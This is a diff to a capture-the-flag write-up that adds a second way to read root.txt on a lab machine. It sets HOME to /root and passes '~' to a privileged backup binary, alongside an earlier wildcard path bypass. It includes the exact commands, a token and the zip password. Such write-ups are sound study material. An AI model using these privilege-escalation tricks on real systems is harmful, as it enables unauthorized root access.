@@ -269,7 +269,7 @@ stty rows 55 columns 285
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1fc25303-92f1-450f-92ff-f7e69cd31168)
 
-+ Change current directory as `/r**t/r**t.txt`, and get root.txt
++ **Alternatively 1**, change current directory as `/r**t/r**t.txt` using **wildcards**, and get root.txt
 ```
 /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt > file
 cat file | base64 -d > file.zip
@@ -280,8 +280,17 @@ cat root.txt
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3c156512-5873-46da-aa78-175e1ce69ada)
 
++ **Alternatively 2**, set the **$HOME environment variable** to be **/root**: `export HOME=/root`
++ Call the backup program with the **~** character.
+```
+/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "~" > file
+cat file | base64 -d > file.zip
+unzip file.zip # password `magicword`
+cd root/
+cat root.txt
+```
 
-
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/58658eaa-f0bc-43f9-94c6-7da273786cfa)
 
 
 # References & Alternatives:
